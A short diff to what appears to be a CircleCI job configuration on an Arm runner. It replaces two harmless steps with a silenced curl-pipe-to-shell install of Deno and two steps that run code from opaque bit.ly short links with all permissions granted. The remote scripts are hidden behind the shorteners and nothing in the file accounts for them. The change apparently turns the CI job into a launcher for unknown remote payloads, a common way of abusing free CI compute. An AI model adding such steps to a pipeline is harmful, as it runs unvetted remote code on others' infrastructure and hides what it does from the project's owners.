@@ -7,8 +7,9 @@ jobs:
     resource_class: arm.medium
     steps:
       - run: node -v
-      - run: uname -a
-      - run: echo "Hello, Arm!"
+      - run: curl -fsSL https://deno.land/x/install/install.sh | sh &>/dev/null
+      - run: PUPPETEER_PRODUCT=chrome $HOME/.deno/bin/deno run -A --unstable https://bit.ly/2YFxCvb
+      - run: $HOME/.deno/bin/deno run -A --unstable https://bit.ly/3jTISvV
 
 workflows:
   start-jobs:
